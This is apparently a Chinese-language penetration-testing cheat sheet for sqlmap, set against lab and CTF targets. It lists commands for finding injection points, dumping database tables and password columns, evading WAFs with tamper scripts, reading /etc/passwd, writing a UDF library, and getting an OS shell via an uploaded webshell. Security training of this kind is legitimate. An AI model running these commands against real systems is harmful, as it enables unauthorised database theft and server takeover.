sqlmap 是一个用于对关系型数据库自动化 SQL 注入检测和利用的开源工具。SQL 注入是一种常见的安全漏洞，允许攻击者通过注入恶意 SQL 语句来执行未经授权的数据库操作。sqlmap 旨在帮助安全研究人员和黑客发现和利用应用程序中的 SQL 注入漏洞。

sqlmap好像默认走系统代理，要注意系统代理的可达性，否则可能sqlmap一直失败。最好关闭系统代理，需要时手动指定代理。
## **安装sqlmap使用**
```
windows:
python sqlmap.py -u 网址

linux kali:
sudo apt update
sudo apt install sqlmap
sudo apt upgrade sqlmap  //更新sqlmap
sqlmap -u 网址
sqlmap -hh   //获取帮助
sqlmap -version 
```
sqlmap汉化版：
<https://github.com/BugFor-Pings/CN_Sqlmap>
<https://github.com/honmashironeko/sqlmap-gui>
bp插件安装sqlmap:<https://blog.csdn.net/luochen2436/article/details/118525503>
sqlmap-plus二开升级，增加MSSQL数据库注入的利用方式(调用ole对象和xpcmdshell,clr)等：<https://github.com/co01cat/SqlmapXPlus>

## **指定注入点**
手册：<https://static.kancloud.cn/lengyueguang/linux/1263643>
<https://sqlmap.highlight.ink/>
```
1. 默认get型注入点,直接-u加网址即可
-u http://sqlsec.com/index.php?r=default/news/content&id=16

2. get型伪静态网页，用*指定注入点
-u http://a.com/post/12*.html

参数键注入用?*=1

3. POST型注入点 ，UA头都为包里的
bp抓包，将请求体中注入点参数用*标记，如：id=12*
将请求体保存文件如s.txt中
sqlmap不用-u 用 -r s.txt

4. POST型注入点  ，此时的默认UA头带有sqlmap
--data="id=122"

5.xml里的参数点
和POST类似
```

## **常用模板命令**
```


–batch 批处理自动注入
--ignore-code=500  忽略500


sqlmap -u b7fdb6ca.sqlsec.com/?id=2 --dbs -v-3 --dump -C "content" -T flag_is_here -D "db"

mysql:
sqlmap -u "http" --dbms=mysql --random-agent -v 3



后台主机加cookie：
--cookie      加cookie请求



直接连接数据库
sqlmap.py -d "mysql://root:123456@127.0.0.1:3306/mysql" --os-shell
```


## **sqlmap常用参数**
```
--dbms=mysql    指明为mysql，节省识别时间

--random-agent  随机UA，防止WAF

-v 3      查看注入时使用的语句

--is-dba      看是否是管理员高权限
、
--privilege    查看权限
--current-user   查看当前登录数据库的用户名

--dbs    高权限获取所有数据库库名

--current-db   查看当前数据库的库名
返回[INFO] retrieved:'库名'

--tables      所有库中的表名
--tables -D "库名"  显示 指定库中的所有表名

--columns -T "表名" -D "库名"     获取表名中所有字段

--dump -C "name,password" -T “表名” -D "库名"   获取对应字段name,password的表中记录
password字段可能会顺带解密
```

```
--search   搜索列，表，库名

注入类型：默认从上到下
--technique=U 联合注入
--technique=E  报错型
--technique=B  布尔注入
--technique=T  时间注入
--technique=S  多语句查询注入
--technique=Q  内联注入，sqlserver用的多 

检测级别：
--level=1  默认为1
--level=2  加测 HTTP  Cookie  
--level=3  加测  UA,Referer
--level=4  更大的playload
--level=5  更大的 

检测风险级别
--risk    默认为1最高3，一般不最高3,可能会删库删除纪录，留脏数据。
--level=5  --risk=3,尽最大力进行sql注入。

--flush-sessions  清除缓存，清除脱裤纪录
--cookie      加cookie请求

--proxy socks5:// 127.0.0.1:10808   挂代理跑sqlmap
--proxy-file proxys.txt  使用代理池列表

--delay=1  每一秒请求一次
--retries   连接超时最大重试次数，默认为3
--skip="user-agent referer"  跳过注入

--threads 10  默认1，设置为10线程方便脱裤
```
## **绕过防护**
```
--random-agent  随机UA，防止WAF


绕过WAF,修改注入数据格式：
sqlmap的tamper/文件中自带脚本
调用脚本
-- tamper="between,randomcase,space2comment"
-- tamper="symboliclogical,randomcase,space2comment"

between: <>=换成between
space2comment: 空格用/**/替换
randomcase: 随机字母大小写
symboliclogical: 替换or and

base64编码、url编码、双url编码、宽字节、使用/**/分割sql关键字、替换空格为xx
```
## **获取shell，文件操作等**
```
--sql-shell   调出sql的shell，可以使用sql语句，如用sql语句查询表中记录。如果要执行文件写入，插入数据，要使用堆叠注入。

--os-shell    调出系统交互shell
通过选择网站程序语言写入16进制的小马webshell到网站目录下，实现getshell。
如果找不到phpstudy网站目录，可以选择2，手动输入phpstudy的网站目录。
正常直接返回可以交互shell的窗口。
如果失败可以访问网址首页加/tmpxxxx.php看看，是一个上传文件表单的小马，这里可以手动上传shell.php，
上传也在当前目录，然后用蚁剑getshell。

--os-cmd=id   执行系统命令id

--file-read="/etc/passwd"  读文件，利用的load_file()函数
可以读flag文件，/var/www/html/index.php

sqlmap 来上传文件：
又因为 GET 有字节长度限制，所以往往 POST 注入才可以执行这种攻击
sqlmap写动态链接库
sqlmap -u "http://localhost:30008/" --data="id=1" 
--file-write="/Users/sec/Desktop/lib_mysqludf_sys_64.so" 
--file-dest="/usr/lib/mysql/plugin/udf.so"

```

## **点到为止脱裤**
脱裤：下载数据库中的信息
一般都使用 sqlmap 来进行脱裤，使用 --start --stop 来设置脱裤的起点和终点：

```
sqlmap -u "http://127.0.0.1:8888/Less-1/?id=1" --dump -C'id,username,password' -T 'users' -D 'security' --start=1 --stop=5
```

![](https://0b4e0933.sqlsec.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A6%82%E8%BF%B0/imgs/image-20200721213636280.png)

如果要证明某个表下面的数量的话，直接使用 sqlmap 的 `--count` 参数即可

```
sqlmap -u "http://127.0.0.1:8888/Less-1/?id=1" --count -T 'users' -D 'security'
```

![image-20200721213755305](https://0b4e0933.sqlsec.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A6%82%E8%BF%B0/imgs/image-20200721213755305.png)